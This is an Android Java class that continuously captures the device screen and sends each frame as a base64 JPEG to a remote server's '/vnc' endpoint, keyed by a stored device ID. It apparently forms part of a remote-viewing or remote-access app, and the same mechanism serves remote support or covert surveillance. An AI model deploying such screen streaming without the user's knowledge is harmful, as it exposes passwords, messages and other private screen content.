package com.yiwugou.yiwukanz;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ScreenCapturer {

    private static final String TAG = "ScreenCapturer";
    private static final int MAX_IMAGES = 2;
    private static final int JPEG_QUALITY = 60;
    private static final int CONNECT_TIMEOUT = 30;
    private static final int READ_TIMEOUT = 30;
    private static final int WRITE_TIMEOUT = 30;

    private final Context context;
    private final MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private boolean isCapturing = false;

    private final OkHttpClient httpClient;
    private final SharedPreferences sharedPreferences;

    public ScreenCapturer(Context context, MediaProjection mediaProjection) {
        this.context = context.getApplicationContext();
        this.mediaProjection = mediaProjection;

        // Initialize HTTP client with timeouts
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(CONNECT_TIMEOUT, TimeUnit.SECONDS)
                .readTimeout(READ_TIMEOUT, TimeUnit.SECONDS)
                .writeTimeout(WRITE_TIMEOUT, TimeUnit.SECONDS)
                .build();

        // Get shared preferences
        this.sharedPreferences = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE);

        // Initialize screen metrics
        initScreenMetrics();
        // Initialize background thread
        initBackgroundThread();
    }

    private void initScreenMetrics() {
        try {
            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            if (windowManager == null) {
                Log.e(TAG, "WindowManager is null");
                return;
            }

            Display display = windowManager.getDefaultDisplay();
            DisplayMetrics metrics = new DisplayMetrics();

            // Use appropriate method based on API level
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                display.getRealMetrics(metrics);
            } else {
                display.getMetrics(metrics);
            }

            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;

            Log.d(TAG, "Screen metrics: " + screenWidth + "x" + screenHeight + " density: " + screenDensity);

        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize screen metrics", e);
            // Set default values
            screenWidth = 1080;
            screenHeight = 1920;
            screenDensity = DisplayMetrics.DENSITY_DEFAULT;
        }
    }

    private void initBackgroundThread() {
        backgroundThread = new HandlerThread("ScreenCaptureThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    public void start() {
        if (isCapturing) {
            Log.w(TAG, "Screen capture already started");
            return;
        }

        try {
            Log.d(TAG, "Starting screen capture");

            // Register media projection callback
            mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.d(TAG, "MediaProjection stopped");
                    stop();
                }
            }, backgroundHandler);

            // Create ImageReader for screen capture
            imageReader = ImageReader.newInstance(screenWidth, screenHeight,
                    PixelFormat.RGBA_8888, MAX_IMAGES);
            Surface surface = imageReader.getSurface();

            // Create virtual display
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenCaptureDisplay",
                    screenWidth,
                    screenHeight,
                    screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    surface,
                    null,  // VirtualDisplay.Callback
                    backgroundHandler);

            if (virtualDisplay == null) {
                Log.e(TAG, "Failed to create virtual display");
                stop();
                return;
            }

            // Set image available listener
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    try (Image image = reader.acquireLatestImage()) {
                        if (image != null) {
                            processImage(image);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing image", e);
                    }
                }
            }, backgroundHandler);

            isCapturing = true;
            Log.d(TAG, "Screen capture started successfully");

        } catch (Exception e) {
            Log.e(TAG, "Failed to start screen capture", e);
            stop();
        }
    }

    private void processImage(Image image) {
        try {
            Bitmap bitmap = imageToBitmap(image);
            if (bitmap != null) {
                byte[] jpegData = bitmapToJpeg(bitmap, JPEG_QUALITY);
                if (jpegData != null && jpegData.length > 0) {
                    String base64Image = Base64.encodeToString(jpegData, Base64.NO_WRAP);
                    sendToServer(base64Image);
                }
                bitmap.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error converting image", e);
        }
    }

    private void sendToServer(String base64Image) {
        String deviceId = sharedPreferences.getString("device_id", null);
        if (deviceId == null || deviceId.isEmpty()) {
            Log.e(TAG, "Device ID not found");
            return;
        }

        // Create JSON payload
        String jsonBody = String.format(
                "{\"image\":\"%s\",\"width\":%d,\"height\":%d}",
                base64Image, screenWidth, screenHeight);

        RequestBody body = RequestBody.create(
                jsonBody, MediaType.parse("application/json; charset=utf-8"));

        String url = MainService.serverUrl + "/vnc?id=" + deviceId;
        if (url == null || url.isEmpty() || url.equals("/vnc?id=" + deviceId)) {
            Log.e(TAG, "Server URL is not configured");
            return;
        }

        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .addHeader("Content-Type", "application/json")
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send screen capture to server", e);
            }

            @Override
            public void onResponse(Call call, Response response) {
                try {
                    if (!response.isSuccessful()) {
                        Log.w(TAG, "Server returned error: " + response.code());
                    }
                } finally {
                    response.close();
                }
            }
        });
    }

    private Bitmap imageToBitmap(Image image) {
        try {
            Image.Plane[] planes = image.getPlanes();
            if (planes == null || planes.length == 0) {
                Log.e(TAG, "Image has no planes");
                return null;
            }

            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * screenWidth;

            // Create bitmap with the correct dimensions
            Bitmap bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight,
                    Bitmap.Config.ARGB_8888);

            if (bitmap == null) {
                Log.e(TAG, "Failed to create bitmap");
                return null;
            }

            bitmap.copyPixelsFromBuffer(buffer);

            // If there's padding, create a sub-bitmap without padding
            if (rowPadding > 0) {
                Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                bitmap.recycle();
                return croppedBitmap;
            }

            return bitmap;

        } catch (Exception e) {
            Log.e(TAG, "Error converting image to bitmap", e);
            return null;
        }
    }

    private byte[] bitmapToJpeg(Bitmap bitmap, int quality) {
        if (bitmap == null || bitmap.isRecycled()) {
            Log.e(TAG, "Bitmap is null or recycled");
            return new byte[0];
        }

        try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
            boolean success = bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            if (!success) {
                Log.e(TAG, "Failed to compress bitmap to JPEG");
                return new byte[0];
            }
            baos.flush();
            return baos.toByteArray();
        } catch (IOException e) {
            Log.e(TAG, "Error converting bitmap to JPEG", e);
            return new byte[0];
        }
    }

    public void stop() {
        if (!isCapturing) {
            return;
        }

        Log.d(TAG, "Stopping screen capture");

        // Release virtual display
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }

        // Close image reader
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }

        // Stop media projection
        if (mediaProjection != null) {
            mediaProjection.stop();
        }

        // Stop background thread
        if (backgroundThread != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                backgroundThread.quitSafely();
            } else {
                backgroundThread.quit();
            }
            try {
                backgroundThread.join(1000); // Wait 1 second for thread to finish
            } catch (InterruptedException e) {
                Log.e(TAG, "Interrupted while waiting for background thread to finish", e);
            }
            backgroundThread = null;
            backgroundHandler = null;
        }

        isCapturing = false;
        Log.d(TAG, "Screen capture stopped");
    }

    public boolean isCapturing() {
        return isCapturing;
    }

    public void release() {
        stop();

        // Cancel all pending HTTP calls
        if (httpClient != null) {
            httpClient.dispatcher().cancelAll();
        }
    }

    public int getScreenWidth() {
        return screenWidth;
    }

    public int getScreenHeight() {
        return screenHeight;
    }
}